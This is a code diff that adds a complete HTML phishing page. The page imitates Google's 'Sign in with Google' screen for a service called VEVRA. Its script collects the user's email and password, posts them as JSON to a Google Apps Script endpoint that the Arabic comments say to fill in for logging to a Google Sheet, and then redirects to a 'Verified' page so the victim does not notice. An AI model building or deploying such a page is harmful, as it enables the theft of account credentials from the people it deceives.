@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            margin: 20px;
+        }
+
+        .google-signin {
+            background-color: #2a2a2a;
+            padding: 16px 24px;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+
+        .google-logo {
+            width: 20px;
+            height: 20px;
+        }
+
+        .google-signin span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .main-content {
+            background-color: #2a2a2a;
+            padding: 60px 80px;
+            border-radius: 0 0 12px 12px;
+            display: flex;
+            
+            /* center logo
+            justify-content: space-between;
+            align-items: center;
+             */
+        }
+
+        .left-section {
+            flex: 1;
+        }
+
+        .logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #a0a0a0;
+            margin-bottom: 8px;
+        }
+
+        .subtitle a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .right-section {
+            flex: 1;
+            max-width: 400px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 8px;
+            color: #e0e0e0;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #1a1a1a;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #fff;
+        }
+
+        .forgot-link {
+            display: block;
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .privacy-notice {
+            font-size: 13px;
+            color: #a0a0a0;
+            margin: 24px 0;
+            line-height: 1.5;
+        }
+
+        .privacy-notice a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .privacy-notice a:hover {
+            text-decoration: underline;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .create-account {
+            color: #fff;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background-color: #8ab4f8;
+            color: #000;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .next-btn:hover {
+            background-color: #a8c7fa;
+        }
+
+        .next-btn:disabled {
+            background-color: #4a4a4a;
+            color: #808080;
+            cursor: not-allowed;
+        }
+
+        .hidden {
+            display:none;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+                padding: 40px 30px;
+            }
+
+            .right-section {
+                max-width: 100%;
+                margin-top: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-signin">
+            <img src="images/Google Logo.PNG" alt="Logo" class="google-logo">
+            <span>Sign in with Google</span>
+        </div>
+        
+        <div class="main-content">
+            <div class="left-section">
+                <img src="images/NEDA0483.PNG" alt="Logo" class="logo">
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to <a href="https://www.vevra.uk">VEVRA</a></p>
+            </div>
+
+            <div class="right-section">
+                <form id="loginForm">
+                    <!-- Username Step -->
+                    <div id="usernameStep">
+                        <div class="form-group">
+                            <label for="username">Email or phone</label>
+                            <input type="text" id="username" name="username" required>
+                            <a href="#" class="forgot-link">Forgot email?</a>
+                        </div>
+
+                        <div class="privacy-notice">
+                            Before using this app, you can review VEVRA's <a href="#">privacy policy</a> and <a href="#">terms of service</a>.
+                        </div>
+
+                        <div class="actions">
+                            <a href="#" class="create-account">Create account</a>
+                            <button type="button" class="next-btn" id="usernameNextBtn">Next</button>
+                        </div>
+                    </div>
+
+                    <!-- Password Step -->
+                    <div id="passwordStep" class="hidden">
+                        <div class="form-group">
+                            <label  for="password">Password</label>
+                            <input type="password" id="password" name="password" required>
+                            <a href="#" class="forgot-link">Forgot password?</a>
+                        </div>
+
+                        <div class="privacy-notice">
+                            Your information will be securely stored.
+                        </div>
+
+                        <div class="actions">
+                            <a type="button" class="create-account" id="backBtn">Try another way</a>
+                            <button type="submit" class="next-btn" id="submitBtn">Sign in</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const usernameStep = document.getElementById('usernameStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const usernameNextBtn = document.getElementById('usernameNextBtn');
+        const backBtn = document.getElementById('backBtn');
+        const loginForm = document.getElementById('loginForm');
+        
+        // Google Sheets Configuration
+        // استبدل هذا الرابط برابط Google Apps Script الخاص بك
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
+
+        // الانتقال من اسم المستخدم إلى كلمة السر
+        usernameNextBtn.addEventListener('click', function() {
+            if (usernameInput.value.trim() === '') {
+                return; // تم إزالة التنبيه
+            }
+            usernameStep.classList.add('hidden');
+            passwordStep.classList.remove('hidden');
+            passwordInput.focus();
+        });
+
+        // العودة إلى اسم المستخدم
+        backBtn.addEventListener('click', function() {
+            passwordStep.classList.add('hidden');
+            usernameStep.classList.remove('hidden');
+            usernameInput.focus();
+        });
+
+        // إرسال البيانات
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (username === '' || password === '') {
+                return; // تم إزالة التنبيه
+            }
+
+            // إرسال البيانات إلى Google Sheet
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Signing in...';
+
+            // إرسال البيانات إلى Google Sheets باستخدام XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", GOOGLE_SCRIPT_URL, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    // إعادة تعيين النموذج
+                    loginForm.reset();
+                    
+                    // إعادة تفعيل الزر
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Sign in';
+                    
+                    // التوجيه إلى صفحة Verified.html بعد تأخير قصير
+                    setTimeout(function() {
+                        window.location.href = 'Verified.html';
+                    }, 500);
+                }
+            };
+            
+            // إرسال البيانات
+            xhr.send(JSON.stringify({
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            }));
+            
+            // في حالة فشل الطلب، قم بالتحويل بعد 3 ثوانٍ كخطة احتياطية
+            setTimeout(function() {
+                if (document.getElementById('loginForm')) {
+                    window.location.href = 'Verified.html';
+                }
+            }, 3000);
+        });
+
+        // التعامل مع Enter في حقل اسم المستخدم
+        usernameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                usernameNextBtn.click();
+            }
+        });
+    </script>
+</body>
+</html>
